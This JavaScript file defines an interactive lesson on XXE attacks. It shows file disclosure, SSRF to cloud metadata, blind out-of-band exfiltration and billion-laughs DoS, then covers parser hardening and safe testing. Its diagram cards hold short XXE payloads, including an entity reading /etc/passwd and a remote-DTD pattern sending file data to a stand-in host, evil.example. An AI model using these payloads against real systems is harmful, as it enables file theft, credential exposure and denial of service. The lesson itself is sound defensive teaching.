(function () {
  const { block, device, card, link, both, flow, rt, red, green, amber, gray, note, bad, good, warn } = SD;

  const alice = (tags = [], o = {}) => device(0, -20, Object.assign({ label: "Alice", tags }, o));
  const mallory = (tags = [], o = {}) => device(0, -20, Object.assign({ label: "attacker", labelIcon: "skull", screen: "red", tags }, o));
  const app = (tags = [], o = {}) => block(0, -6, Object.assign({ label: ["Invoice", "API"], glyph: "fileCode", tags }, o));
  const disk = (tags = [], o = {}) => block(12, -6, Object.assign({ s: 3.6, h: 34, label: ["/etc", "passwd"], glyph: "file", color: "yellow", tags, pills: "below" }, o));
  const meta = (tags = [], o = {}) => block(12, 5, Object.assign({ s: 3.6, h: 34, label: ["cloud", "metadata"], glyph: "cloud", color: "yellow", tags, pills: "below" }, o));
  const evil = (tags = [], o = {}) => block(-15, -4, Object.assign({ label: ["evil", "DTD host"], glyph: "skull", color: "red", tags }, o));
  const upLeft = (dx = -420, dy = -190) => ({ x: 0, y: -6, dx, dy });

  const ask = (who, label = "POST /invoices.xml") => both(who, "app", { label, labelAt: 0.5, labelSide: "below" });
  const toDisk = (o = {}) => both("app", "disk", Object.assign({ label: "file:///etc/passwd", labelTone: "red", labelAt: 0.5 }, o));
  const toMeta = (o = {}) => both("app", "meta", Object.assign({ label: "http://169.254.169.254/", labelTone: "red", labelAt: 0.5 }, o));

  SD.lesson({
    id: "xxe",
    title: "XXE (XML External Entity)",
    summary: "A parser that expands entities will fetch files and URLs for you: disclosure, SSRF, blind OOB exfil, and the parser flags that shut it down.",
    minutes: 15,
    level: "advanced",
    metrics: [
      { id: "parser", label: "Parser expands", icon: "fileCode" },
      { id: "reaches", label: "Attacker reaches", icon: "eye" },
      { id: "defense", label: "Defense", icon: "shield" },
    ],
    legend: [["mine", "Alice"], ["poison", "malicious XML"], ["secret", "file / creds"], ["req", "parser fetch"], ["ping", "OOB hit"], ["empty", "blocked"]],
    goals: [
      { text: "How an external entity becomes a file read", step: 1 },
      { text: "XXE as SSRF to metadata and internals", step: 2 },
      { text: "Blind / OOB XXE with a hostile DTD", step: 3 },
      { text: "Billion laughs and DoS via entities", step: 4 },
      { text: "Where XML still hides (SAML, SVG, Office)", step: 6 },
      { text: "Disable DTDs / use a safe library", step: 7 },
    ],
    steps: [
      {
        short: "XML upload",
        chapter: "setup",
        title: "An API that parses the invoice as XML",
        body: [
          "Alice uploads an invoice. The API reads <code>Content-Type: application/xml</code> and hands the body to a stock XML parser: Java <code>DocumentBuilderFactory</code>, Python <code>xml.etree</code>, PHP <code>simplexml_load_string</code>, .NET <code>XmlDocument</code>. The document is a purchase order with line items.",
          "XML has a feature most teams forget: a <span class=\"term\">DOCTYPE</span> can declare <span class=\"term\">entities</span>, named shortcuts the parser expands before the app sees the tree. Internal entities are text macros. External entities tell the parser to fetch a file or URL and splice the result in. That fetch runs as the application user, from inside the network.",
        ],
        callout: { kind: "insight", text: "XXE is not \"XML is unsafe\". It is \"this parser was left willing to fetch on the caller's behalf\"." },
        metrics: { parser: warn("DTD + entities on"), reaches: "-", defense: "-" },
        scene: {
          entities: {
            alice: alice([note("POST invoice.xml", "upload")]),
            app: app([amber("DocumentBuilderFactory default", "fileCode")]),
            disk: disk([], { dim: 0.5 }),
            meta: meta([], { dim: 0.5 }),
            card: card(upLeft(), "Innocent looking body", ["<?xml version=\"1.0\"?>", "<invoice>", "  <total>120.00</total>", "</invoice>", "# parser still accepts a DOCTYPE"], { icon: "file" }),
          },
          links: { ua: ask("alice"), ad: both("app", "disk", { style: "dashed" }) },
          flows: [flow("ua", "mine", { rate: 0.7 })],
        },
      },
      {
        short: "File read",
        chapter: "attack",
        title: "External entity: read a file into the response",
        body: [
          "The attacker sends a DOCTYPE that defines <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code> and puts <code>&amp;xxe;</code> where the total should be. The parser resolves the entity before returning the document, so the response body (or an error that echoes content) contains the file.",
          "Classic targets: <code>/etc/passwd</code>, application configs, cloud credential files, Windows <code>C:/Windows/win.ini</code>. If the app reflects any field of the parsed tree, the file leaves the server. Even without reflection, a verbose exception can leak the first chunk.",
        ],
        callout: { kind: "warn", text: "file:// is only one scheme. Some parsers also honor gopher://, expect://, or jar: URLs depending on the platform." },
        changes: ["- DOCTYPE with SYSTEM file://", "- Parser fetches /etc/passwd", "- Content appears in the response"],
        metrics: { parser: bad("external entity"), reaches: bad("/etc/passwd"), defense: bad("none") },
        scene: {
          entities: {
            client: mallory([red("ENTITY xxe SYSTEM file://...", "terminal")]),
            app: app([red("expands &xxe; into the tree", "alert")]),
            disk: disk([red("contents returned", "file")], { heat: 0.4 }),
            meta: meta([], { dim: 0.5 }),
            card: card(upLeft(), "File disclosure", ["<!DOCTYPE foo [", "  <!ENTITY xxe SYSTEM", "    \"file:///etc/passwd\">", "]>", "<total>&xxe;</total>", "! response now holds the file"], { icon: "file" }),
          },
          links: { ua: ask("client", "POST /invoices.xml"), fd: toDisk() },
          flows: [flow("ua", "poison", { rate: 0.7 }), rt("fd", "poison", { rate: 0.7, back: "secret", delay: 0.5 })],
        },
      },
      {
        short: "SSRF",
        chapter: "attack",
        title: "SYSTEM http://... turns XXE into SSRF",
        body: [
          "Swap the file URL for <code>http://169.254.169.254/latest/meta-data/</code> or <code>http://10.0.3.7:8080/admin</code>. The parser issues the HTTP request from inside the VPC, the same blast radius as classic SSRF: metadata keys, internal admin panels, port scans via timing.",
          "This is why XXE shows up next to SSRF on interview boards. The difference is the trigger: a DTD entity instead of a URL field. Defenses overlap (no internal egress, IMDSv2) but the primary fix is still to stop the parser from fetching.",
        ],
        callout: { kind: "tip", text: "If the response does not show the body, you still have a blind SSRF: watch for DNS or HTTP callbacks from the app's IP." },
        changes: ["- Entity points at an internal URL", "- Parser fetches from the VPC", "- Metadata / admin reachable"],
        metrics: { parser: bad("external entity"), reaches: bad("metadata / admin"), defense: bad("none") },
        scene: {
          entities: {
            client: mallory([red("SYSTEM http://169.254...", "terminal")]),
            app: app([red("fetches inside the VPC", "network")]),
            disk: disk([], { dim: 0.4 }),
            meta: meta([red("role keys returned", "key")], { heat: 0.4 }),
            card: card(upLeft(), "XXE as SSRF", ["<!ENTITY xxe SYSTEM", "  \"http://169.254.169.254/", "   latest/meta-data/\">", "! same trust as link-preview SSRF", "# IMDSv2 still helps the target"], { icon: "network" }),
          },
          links: { ua: ask("client"), am: toMeta() },
          flows: [flow("ua", "poison", { rate: 0.7 }), rt("am", "poison", { rate: 0.7, back: "secret", delay: 0.5 })],
        },
      },
      {
        short: "Blind OOB",
        chapter: "attack",
        title: "Blind XXE: exfil over a hostile DTD",
        body: [
          "When the app never echoes entity content, attackers switch to out-of-band. The uploaded XML loads a remote DTD from <code>http://evil.example/xxe.dtd</code>. That DTD defines parameter entities that read a local file and then trigger a second HTTP request whose URL path or query carries the data.",
          "Burp Collaborator and interactsh catch those callbacks. Even a single DNS lookup for <code>x.evil.example</code> proves the parser is expanding external entities. Treat any unexpected egress from an XML endpoint as a confirmed finding.",
        ],
        callout: { kind: "insight", text: "Blind XXE is often more reliable in modern apps than in-band disclosure, because error messages got quieter while parsers stayed permissive." },
        changes: ["- Remote DTD fetched", "- Parameter entities read a file", "- Data leaves on a callback URL"],
        metrics: { parser: bad("remote DTD"), reaches: bad("OOB exfil"), defense: bad("none") },
        scene: {
          entities: {
            client: mallory([red("%dtd SYSTEM evil.example", "terminal")]),
            app: app([red("fetches remote DTD", "alert")]),
            disk: disk([red("passwd read", "file")]),
            evil: evil([red("OOB canary hit", "radar")], { x: -17, y: 6 }),
            card: card(upLeft(-460, -210), "OOB pattern", ["XML -> evil.example/xxe.dtd", "DTD reads file:///etc/passwd", "DTD requests", "  http://evil/?d=<data>", "# Collaborator / interactsh"], { icon: "upload" }),
          },
          links: {
            ua: ask("client"),
            ae: both("app", "evil", { label: "DTD + callback", labelTone: "red", labelAt: 0.62, labelSide: "below" }),
            fd: toDisk({ label: "file read" }),
          },
          flows: [flow("ua", "poison", { rate: 0.6 }), rt("ae", "ping", { rate: 0.7, back: "secret", delay: 0.5 }), rt("fd", "poison", { rate: 0.5, delay: 0.8 })],
        },
      },
      {
        short: "Billion laughs",
        chapter: "attack",
        title: "Entity expansion as denial of service",
        body: [
          "Even without leaving the machine, nested entities can explode memory. The \"billion laughs\" payload defines <code>lol9</code> as ten <code>lol8</code>s, each of those ten <code>lol7</code>s, and so on, until expansion tries to allocate gigabytes from a kilobyte of XML.",
          "Quadratic blowups and parameter-entity tricks hit older parsers too. Limits on entity expansion depth and size are part of a hardened config, but the clean answer for untrusted input is still: do not process DTDs at all.",
        ],
        callout: { kind: "warn", text: "A DoS finding still matters in interviews: it shows you understand entities beyond the file-read demo." },
        changes: ["- Nested entities expand exponentially", "- Worker OOM / CPU spike", "+ Expansion limits or no DTDs"],
        metrics: { parser: bad("nested entities"), reaches: bad("DoS / OOM"), defense: bad("no limits") },
        scene: {
          entities: {
            client: mallory([red("lol9 -> lol8 x10 ...", "terminal")]),
            app: app([red("memory climbs to OOM", "alert")], { heat: 0.5 }),
            disk: disk([], { dim: 0.5 }),
            card: card(upLeft(), "Billion laughs", ["<!ENTITY lol \"lol\">", "<!ENTITY lol2 \"&lol;&lol;...\">", "...", "<!ENTITY lol9 \"&lol8;&lol8;...\">", "! tiny XML, huge expansion", "= cap depth/size, or disable DTDs"], { icon: "flame" }),
          },
          links: { ua: ask("client") },
          flows: [flow("ua", "poison", { rate: 1.2 })],
        },
      },
      {
        short: "JSON myth",
        chapter: "insight",
        title: "\"We only accept JSON\" is not enough",
        body: [
          "Teams say the API is JSON-only, then forget the other XML doors: SAML assertions, SOAP admin endpoints, Office document uploads (docx/xlsx are zip+XML), SVG images, RSS imports, XSLT transforms, and content-type confusion where <code>application/xml</code> is still accepted beside JSON.",
          "Attack surface review means listing every library that parses XML, not every route that says so in OpenAPI. One forgotten SOAP adapter is enough.",
        ],
        callout: { kind: "tip", text: "Ask in design reviews: \"Where does XML enter this system, including files and auth protocols?\"" },
        changes: ["~ Public API is JSON", "- SAML / SOAP / SVG / Office still parse XML", "+ Inventory every XML parser"],
        metrics: { parser: warn("hidden XML paths"), reaches: bad("via SAML/SVG/Office"), defense: bad("assumed JSON-only") },
        scene: {
          entities: {
            client: mallory([red("upload evil.svg / saml.xml", "file")]),
            app: app([amber("JSON routes + XML sidecars", "layers")]),
            disk: disk([red("still readable", "file")]),
            card: card(upLeft(-430), "Hidden XML doors", ["SAML / SOAP", "docx, xlsx, odt (zip+XML)", "SVG, RSS, XSLT", "Content-Type confusion", "! one permissive parser undoes JSON-only"], { icon: "layers" }),
          },
          links: { ua: ask("client", "POST /avatar.svg"), fd: toDisk() },
          flows: [flow("ua", "poison", { rate: 0.7 }), rt("fd", "poison", { rate: 0.6, back: "secret", delay: 0.5 })],
        },
      },
      {
        short: "Disable DTD",
        chapter: "solution",
        title: "Turn off DTDs and external entities",
        body: [
          "Hardening is parser-specific but the idea is the same. Java: set <code>disallow-doctype-decl</code>, disable external general and parameter entities, and disable external DTDs. .NET: <code>XmlReaderSettings</code> with <code>DtdProcessing.Prohibit</code>. PHP: <code>libxml_disable_entity_loader(true)</code> (older) or use hardened options. Python: prefer <code>defusedxml</code> over stdlib parsers.",
          "After flipping the flags, add a regression test that posts a DOCTYPE with an external entity and expects a hard failure, not a file. Keep the test in CI so a dependency upgrade cannot quietly re-enable the feature.",
        ],
        callout: { kind: "tip", text: "Libraries exist so you do not re-derive every flag: defusedxml, OWASP cheat sheets, and secure parser wrappers in most languages." },
        changes: ["+ DOCTYPE / external entities disabled", "+ Safe library (defusedxml, etc.)", "+ CI test with a malicious DOCTYPE"],
        metrics: { parser: good("DTD prohibited"), reaches: good("nothing"), defense: good("hardened parser") },
        scene: {
          entities: {
            client: mallory([red("ENTITY file:///etc/passwd", "terminal")]),
            app: app([green("disallow-doctype-decl", "shieldCheck")]),
            disk: disk([green("never opened", "lock")]),
            card: card(upLeft(-430), "Hardened flags (Java)", ["dbf.setFeature(", "  \"http://apache.org/xml/features/", "   disallow-doctype-decl\", true)", "= external-general-entities: false", "= external-parameter-entities: false", "# Python: defusedxml"], { icon: "shieldCheck" }),
          },
          links: { ua: ask("client"), fd: toDisk({ fail: 0.4 }) },
          flows: [flow("ua", "poison", { rate: 0.7 }), flow("fd", "poison", { rate: 0.6, delay: 0.5, blocked: true })],
        },
      },
      {
        short: "Avoid XML",
        chapter: "solution",
        title: "Prefer formats that cannot fetch",
        body: [
          "If you control the contract, stop taking XML from untrusted parties. JSON, protobuf and length-prefixed binary do not have DTD fetch semantics. When XML is mandatory (SAML, industry feeds), parse with a hardened library in a locked-down worker that has no file or network access beyond what the feature needs.",
          "Least privilege on the parser process caps residual risk: even a missed flag cannot read <code>/etc/shadow</code> or reach the metadata service if the runtime cannot.",
        ],
        callout: { kind: "insight", text: "Strong answer: disable entities, shrink the XML surface, and sandbox whatever must remain." },
        changes: ["+ JSON / protobuf for new APIs", "+ Sandboxed worker for required XML", "+ No metadata route from that worker"],
        metrics: { parser: good("no DTD fetch"), reaches: good("sandboxed"), defense: good("format + sandbox") },
        scene: {
          entities: {
            alice: alice([note("POST /invoices (JSON)", "braces")]),
            app: app([green("JSON only on this route", "check")]),
            disk: disk([green("unreachable", "ban")], { dim: 0.4 }),
            meta: meta([green("IMDSv2 + no route", "shieldCheck")], { dim: 0.4 }),
            card: card(upLeft(-420), "Reduce the surface", ["new APIs: JSON or protobuf", "SAML/SOAP: hardened parser only", "worker: no file, no link-local egress", "= defense in depth if a flag slips"], { icon: "ban" }),
          },
          links: { ua: ask("alice", "POST /invoices (JSON)") },
          flows: [flow("ua", "mine", { rate: 0.7, back: "res" })],
        },
      },
      {
        short: "VAPT",
        chapter: "technique",
        title: "How to test for XXE safely",
        body: [
          "Authorized testing starts with a benign OOB probe: a DOCTYPE that only hits your collaborator domain. If DNS or HTTP fires, external entities are live. Then try in-band file reads on known harmless files, and SSRF to an internal canary you own.",
          "Scan content types and file uploads, not just JSON fields. Automations help (Burp extensions, semgrep rules for unsafe parser construction) but a single manual Collaborator payload still catches the majority of real findings.",
        ],
        callout: { kind: "warn", text: "Do not point XXE SSRF probes at third-party infrastructure you do not own. Use your own canary hosts." },
        changes: ["+ OOB Collaborator probe first", "+ Cover uploads and SOAP/SAML", "+ SAST for unsafe parser setup"],
        metrics: { parser: warn("under test"), reaches: good("only canaries"), defense: good("test coverage") },
        scene: {
          entities: {
            client: mallory([note("authorized probe", "radar")], { label: "tester", labelIcon: "scan", screen: "blue" }),
            app: app([amber("endpoint under test", "search")]),
            evil: evil([green("Collaborator hit", "check")], { label: ["canary", "host"], glyph: "radar", color: "green" }),
            card: card(upLeft(-420), "Probe order", ["1. OOB DNS/HTTP to your canary", "2. in-band file read (harmless file)", "3. SSRF to an owned internal canary", "4. SAST: DocumentBuilderFactory, etc.", "# never scan others' metadata services"], { icon: "radar" }),
          },
          links: { ua: ask("client"), ae: both("app", "evil", { label: "OOB callback", labelAt: 0.55 }) },
          flows: [flow("ua", "ping", { rate: 0.7 }), rt("ae", "ping", { rate: 0.7, back: "ping", delay: 0.5 })],
        },
      },
      {
        short: "Recap",
        chapter: "recap",
        title: "Recap: stop the parser from fetching",
        body: [
          `<table class="compare">
            <thead><tr><th>Risk</th><th>Control</th></tr></thead>
            <tbody>
              <tr><td>File disclosure</td><td>Disable DTDs / external entities</td></tr>
              <tr><td>SSRF via SYSTEM http</td><td>Same flags + egress controls</td></tr>
              <tr><td>Blind OOB</td><td>No remote DTD loads</td></tr>
              <tr><td>Billion laughs</td><td>No DTDs or strict expansion caps</td></tr>
              <tr><td>Hidden XML doors</td><td>Inventory SAML, SVG, Office, SOAP</td></tr>
            </tbody>
          </table>`,
          "Interview shortcut: XXE means the parser fetches for the attacker. Show file read, SSRF and OOB, then name parser hardening (and defusedxml), plus reducing XML surface area.",
        ],
        callout: { kind: "next", text: "Next wave siblings: <b>SSTI</b> (server executes template code) and <b>SSRF</b> (server fetches a URL field). Same theme, different trigger." },
        metrics: { parser: good("DTD off"), reaches: good("nothing"), defense: good("hardened") },
        scene: {
          entities: {
            alice: alice([note("safe invoice XML", "file")]),
            app: app([green("DOCTYPE rejected", "shieldCheck")]),
            disk: disk([green("untouched", "lock")]),
            meta: meta([green("unreachable", "ban")]),
          },
          links: { ua: ask("alice") },
          flows: [flow("ua", "mine", { rate: 0.7, back: "res" })],
        },
      },
    ],
  });
})();
